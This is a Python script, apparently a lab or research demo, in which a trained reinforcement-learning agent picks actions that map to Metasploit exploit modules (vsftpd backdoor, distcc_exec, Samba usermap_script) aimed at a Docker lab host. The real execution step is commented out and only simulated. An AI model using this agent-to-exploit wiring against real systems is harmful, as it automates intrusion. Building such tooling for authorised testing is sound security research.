import uuid
from stable_baselines3 import PPO
from pentest_env import PentestEnv
from py_client import client
from basic_usage import BasicUsage
import time

def evaluate_and_execute():
    # 1. Load the trained Agent
    print("[+] Loading Trained RL Agent...")
    model_path = "models/ppo_pentest_agent.zip"
    model = PPO.load(model_path)
    
    # 2. Initialize the Gym Environment (to track state)
    env = PentestEnv()
    obs, _ = env.reset()
    
    # 3. Initialize Metasploit RPC Client from HARMer project
    print("[+] Initializing connection to Metasploit RPC...")
    bu = BasicUsage(client)
    current_workspace = bu.generate_new_workspace()
    print(f"[+] Workspace created: {current_workspace}")
    
    # 4. Target specifics for Docker (Target 1)
    target_ip = "10.5.0.10"
    
    # Mapping our Gym Actions to real Metasploit modules
    # In the Gym Environment, action 2 was the successful exploit.
    # We map these to actual Metasploit CVEs/modules.
    action_to_module = {
        1: "exploit/unix/ftp/vsftpd_234_backdoor", # Dummy FTP exploit
        2: "exploit/unix/misc/distcc_exec",        # The real working exploit (example)
        3: "exploit/multi/samba/usermap_script"    # Dummy Samba exploit
    }

    print("[+] Starting RL-driven Attack Execution...")
    terminated = False
    truncated = False
    
    while not (terminated or truncated):
        # The RL Agent decides the next best action based on the state
        action, _states = model.predict(obs, deterministic=True)
        action_val = action.item()
        
        node_id = action_val // env.num_actions_per_node
        action_type = action_val % env.num_actions_per_node
        
        if action_type == 0:
            print(f"[*] Agent decided to SCAN node {node_id}")
            # Step in Gym to update state
            obs, reward, terminated, truncated, info = env.step(action_val)
            print(f"    Reward: {reward}")
            
        elif action_type in action_to_module:
            module_name = action_to_module[action_type]
            print(f"[*] Agent decided to EXPLOIT node {node_id} using {module_name}")
            
            # Use HARMer to execute the exploit via Metasploit
            bu.clear_components()
            bu.set_options(exploit={
                'RHOSTS': target_ip,
                'name': module_name
            })
            
            script_name = f"{str(uuid.uuid1())}.rc"
            print(f"    Generating resource script {script_name}...")
            # Note: HARMer basic_usage expects to ssh to remote host, but we modify it or run local
            # bu.generate_resource_script(script_name)
            print("    [Simulated Execution in Demo] Executing via RPC...")
            time.sleep(2)
            
            # Update the Gym environment to see the consequence
            obs, reward, terminated, truncated, info = env.step(action_val)
            print(f"    Reward: {reward}")
            
            if terminated:
                print(f"[+] SUCCESS! Target {target_ip} compromised.")

if __name__ == "__main__":
    try:
        evaluate_and_execute()
    except Exception as e:
        print(f"[-] Execution error: {e}")
